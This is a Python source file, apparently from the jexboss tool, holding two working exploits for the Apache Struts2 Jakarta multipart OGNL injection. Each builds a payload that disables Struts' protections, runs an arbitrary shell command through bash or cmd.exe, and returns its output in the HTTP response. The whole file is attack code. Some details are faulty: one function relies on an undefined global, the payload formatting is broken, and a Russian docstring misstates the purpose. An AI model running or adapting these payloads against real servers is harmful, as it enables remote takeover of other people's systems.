from src.utils.misc import get_random_user_agent


def exploit_struts2_jakarta_multipart_v2(url: str, cmd: str, cookies: str | None) -> str:
    """
    Выполняет OGNL-инъекцию через multipart/form-data в Struts2 Jakarta с фиксированным границей, возвращает тело ответа.
    """
    cmd = cmd.replace("  ", " ")
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "close",
        "User-Agent": get_random_user_agent(),
        "Content-Type": "multipart/form-data; boundary=e85e9b09934f4b9daaa7ff6352cdf2df"
    }
    payload = (b"%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
               b"(#_memberAccess?(#_memberAccess=#dm):"
               b"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
               b"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
               b"(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
               b"(#context.setMemberAccess(#dm))))."
               b"(#gift='%s')."
               b"(#isnix=(@java.lang.System@getProperty('file.separator').equals(\"/\")))."
               b"(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift}))."
               b"(#p=new java.lang.ProcessBuilder(#giftarray))."
               b"(#p.redirectErrorStream(true)).(#process=#p.start())."
               b"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
               b"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
               b"(#ros.flush())}" % cmd.encode("utf-8"))

    body = (
        "--e85e9b09934f4b9daaa7ff6352cdf2df\n"
        f"Content-Disposition: form-data; name=\"form\"; filename=\"{payload}\"\n"
        "Content-Type: application/octet-stream\n\n"
        "jexboss\n"
        "--e85e9b09934f4b9daaa7ff6352cdf2df--\n"
    )

    if cookies:
        headers["Cookie"] = cookies

    response = gl_http_pool.request("POST", url, redirect=True, headers=headers, body=body)
    return str(response.data)


def exploit_struts2_jakarta_multipart(url: str, cmd: str, cookies: str | None, http_pool) -> str:
    """
    Выполняет OGNL-инъекцию через multipart/form-data в Struts2 Jakarta для удаления удалённого кода.
    """
    cmd = cmd.replace("  ", " ")
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "close",
        "User-Agent": get_random_user_agent(),
    }

    content_type = (
        "%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        f"(#gift='{cmd}')."
        "(#isnix=(@java.lang.System@getProperty('file.separator').equals(\"/\")))."
        "(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift}))."
        "(#p=new java.lang.ProcessBuilder(#giftarray))."
        "(#p.redirectErrorStream(true)).(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}"
    )
    headers["Content-Type"] = content_type

    if cookies:
        headers["Cookie"] = cookies
    if cookies:
        headers["Cookie"] = cookies

    # Используем переданный пул, а не глобальную переменную
    response = http_pool.request("GET", url, redirect=True, headers=headers)
    if response.status == 404:
        headers["Content-Type"] = "text/html"
        response = http_pool.request("GET", url, redirect=True, headers=headers)
        if response.status == 200:
            return (
                "   Could not get command output. You need to set up an Authoritative DNS and "
                "try to get the output of the commands via DNS covert channel.\n"
            )
    return response.data
